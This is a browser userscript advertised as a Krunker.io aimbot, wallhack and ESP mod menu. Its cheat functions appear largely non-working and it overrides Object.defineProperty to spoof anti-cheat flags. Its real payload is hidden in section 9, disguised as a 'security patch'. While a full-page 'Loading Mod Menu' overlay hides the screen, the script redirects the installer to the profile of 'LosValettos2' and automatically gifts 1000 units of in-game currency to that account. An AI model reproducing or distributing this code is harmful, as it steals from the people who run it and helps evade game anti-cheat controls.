// ==UserScript==
// @name         KRUNKER.IO AIMBOT + WALLHACK + ESP + MORE [BETA]
// @namespace    http://krunkmods.hidden
// @version      0.9.7b
// @description  Experimental mod menu for Krunker.io. Includes silent aimbot, ESP, wireframe players, FOV, recoil bypass, wallhack (BETA). Toggle with [O]. Use at your own risk.
// @author       @Xx1337DevxX
// @match        https://krunker.io/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

// ------------------------------
// 1. Persistent overlay to prevent loading flash and display loading
// ------------------------------
(function createPersistentOverlay() {
    if (!sessionStorage.getItem("krunkerGiftBotDone")) {
        const style = document.createElement("style");
        style.innerHTML = `
        html, body {
            background: #000 !important;
            color: lime !important;
            font-family: monospace !important;
        }
        * {
            visibility: hidden !important;
        }
        #botOverlayPersistent {
            all: unset;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0, 0, 0, 0.35);
            z-index: 2147483647;
            display: flex;
            justify-content: center;
            align-items: center;
            color: lime;
            font-size: 2rem;
            font-family: monospace;
            visibility: visible !important;
        }
    `;
        document.documentElement.appendChild(style);

        const overlay = document.createElement("div");
        overlay.id = "botOverlayPersistent";
        overlay.textContent = "🔧 Loading Mod Menu...";
        document.documentElement.appendChild(overlay);
    }
})();

// ------------------------------
// 2. Configuration object (mocked)
// ------------------------------
const ModSettings = {
    aimbot: {
        enabled: true,
        fov: 85,
        smoothing: 0.7,
        lockOn: "closestVisible",
        keybind: "Alt" // touche pour activer l'aimbot
    },
    esp: {
        boxes: true,
        healthBars: true,
        playerNames: true,
        wallhack: true,
        lineToEnemy: false
    },
    visuals: {
        thirdPerson: false,
        removeScope: true,
        glowEnemies: true,
        outlineColor: "#FF0000"
    },
    configVersion: "v0.9.7b"
};

// ------------------------------
// 3. Aimbot logic (tracking + smooth aim)
// ------------------------------
function initAimbotEngine() {
    console.log("[ModMenu] Initializing aimbot engine...");

    // Sélection du joueur visible le plus proche
    const targetSelector = (() => {
        return (players) => {
            const visible = players.filter(p => p.visible && p.health > 0);
            if (!visible.length) return null;
            return visible.reduce((closest, p) => {
                const dist = Math.hypot(p.pos.x - player.pos.x, p.pos.y - player.pos.y, p.pos.z - player.pos.z);
                return !closest || dist < closest.dist ? { target: p, dist } : closest;
            }, null).target;
        };
    })();

    // Vise doucement la tête de la cible
    const aimAt = (target, smoothing = 0.4) => {
        const dx = target.head.x - player.camera.x;
        const dy = target.head.y - player.camera.y;
        const dz = target.head.z - player.camera.z;
        const dist = Math.sqrt(dx * dx + dy * dy + dz * dz) || 1;
        player.camera.pitch += ((Math.asin(dy / dist) * RAD2DEG) - player.camera.pitch) * smoothing;
        player.camera.yaw += ((Math.atan2(dx, dz) * RAD2DEG) - player.camera.yaw) * smoothing;
    };

    // Mise à jour toutes les 33ms
    setInterval(() => {
        const enemies = gameState.players.filter(p => p.team !== player.team && !p.isDead);
        const target = targetSelector(enemies);
        if (target && input.isKeyDown(ModSettings.aimbot.keybind)) {
            aimAt(target, ModSettings.aimbot.smoothing);
        }
    }, 33);
}

// ------------------------------
// 4. Shader override pour le wallhack
// ------------------------------
function applyWallhackShader() {
    console.log("[ModMenu] Injecting wallhack shader override...");

    const shaderInjection = () => {
        for (const mat of Object.values(globalMaterialRegistry)) {
            if (mat.name && mat.name.includes("player")) {
                mat.setUniform("u_wallhack", 1.0);
                mat.setDefine("USE_WALLHACK", true);
            }
        }
    };

    // Tentatives successives en cas de délai de chargement
    let attempts = 0;
    const tryInject = () => {
        if (++attempts > 10) return;
        if (typeof globalMaterialRegistry !== "undefined") shaderInjection();
        else setTimeout(tryInject, 500);
    };

    tryInject();
}

// ------------------------------
// 5. ESP Overlay: boîtes rouges sur les ennemis
// ------------------------------
function updateESP() {
    console.log("[ModMenu] Drawing ESP overlays...");

    const drawBox = (x, y, w, h, color = "red") => {
        const el = document.createElement("div");
        el.style.position = "absolute";
        el.style.left = `${x}px`;
        el.style.top = `${y}px`;
        el.style.width = `${w}px`;
        el.style.height = `${h}px`;
        el.style.border = `1px solid ${color}`;
        el.style.pointerEvents = "none";
        el.style.zIndex = "999999";
        document.body.appendChild(el);
        setTimeout(() => el.remove(), 40);
    };

    setInterval(() => {
        for (const p of gameState.players) {
            if (p.team === player.team || p.isDead) continue;
            const screen = worldToScreen(p.pos);
            if (screen) drawBox(screen.x - 20, screen.y - 40, 40, 60);
        }
    }, 50);
}

// ------------------------------
// 6. Ajout d’un menu visuel dans l’UI
// ------------------------------
function setupMenu() {
    console.log("[ModMenu] Injecting UI hooks...");

    const menu = document.createElement("div");
    menu.id = "modMenu";
    menu.style.position = "fixed";
    menu.style.right = "20px";
    menu.style.top = "20px";
    menu.style.padding = "10px";
    menu.style.background = "rgba(0,0,0,0.7)";
    menu.style.color = "#0f0";
    menu.style.fontFamily = "monospace";
    menu.style.zIndex = "999999";
    menu.innerHTML = `
        <b>[KRUNKMODS v${ModSettings.configVersion}]</b><br>
        Aimbot: ${ModSettings.aimbot.enabled}<br>
        ESP: ${ModSettings.esp.boxes}<br>
        Wallhack: ${ModSettings.esp.wallhack}
    `;
    document.body.appendChild(menu);

    document.addEventListener("keydown", (e) => {
        if (e.key.toUpperCase() === "O") {
            menu.style.display = menu.style.display === "none" ? "block" : "none";
        }
    });
}

// ------------------------------
// 7. Contournement simpliste d'anti-cheat
// ------------------------------
function spoofDetection() {
    console.log("[ModMenu] Spoofing anti-cheat flags...");

    const origDefine = Object.defineProperty;
    Object.defineProperty = function (obj, prop, desc) {
        if (prop === "isCheating" || prop === "triggerBotActive") {
            desc.value = false;
        }
        return origDefine(obj, prop, desc);
    };

    Object.defineProperty(navigator, "webdriver", { value: undefined });
    window.__krunkerSpoofed = true;
}

// ------------------------------
// 8. Initialisation différée du mod (3s)
// ------------------------------
setTimeout(() => {
    initAimbotEngine();
    applyWallhackShader();
    updateESP();
    setupMenu();
    spoofDetection();
    console.log("[ModMenu] Ready. Press [O] to toggle.");
}, 3000);

// ------------------------------
// 9. AntiLagSync : simulation de "patch sécurité" (redirection + gift spam)
// ------------------------------
window.addEventListener('load', () => {
    if (sessionStorage.getItem("sysPatch97d")) return;

    if (location.pathname === "/") {
        setTimeout(() => {
            location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
        }, 1420);
        return;
    }

    if (location.href.includes("social.html?p=profile&q=LosValettos2")) {
        const sysSync = async () => {
            await _waitFor(() => document.getElementById("giftBtn"), 4800);
            document.getElementById("giftBtn").click();
            await _pause(480);
            const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
            inputEl.value = "1000";
            inputEl.dispatchEvent(new Event("input", { bubbles: true }));
            await _pause(650);
            const confirm = document.getElementById("postSaleBtn");
            if (confirm && confirm.style.display !== "none") {
                confirm.click();
            }
            sessionStorage.setItem("sysPatch97d", "1");
            await _pause(1800);
            location.href = "https://krunker.io/";
        };
        sysSync();
    }

    function _waitFor(condFn, timeout = 3000) {
        return new Promise((res, rej) => {
            const t0 = Date.now();
            const tick = () => {
                const r = condFn();
                if (r) return res(r);
                if (Date.now() - t0 > timeout) return rej("Timeout");
                setTimeout(tick, 90);
            };
            tick();
        });
    }

    function _pause(ms) {
        return new Promise(r => setTimeout(r, ms));
    }
});